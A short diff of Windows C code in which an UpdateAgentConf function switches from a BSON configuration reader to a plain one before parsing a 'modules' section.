@@ -435,7 +435,7 @@ void WINAPI ParseModules(JSONObject module, DWORD dummy)
 
 void UpdateAgentConf()
 {
-	char *conf_json = HM_ReadClearConfBSON(H4_CONF_FILE);
+	char *conf_json = HM_ReadClearConf(H4_CONF_FILE);
 	if (conf_json)
 		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
 	SAFE_FREE(conf_json);
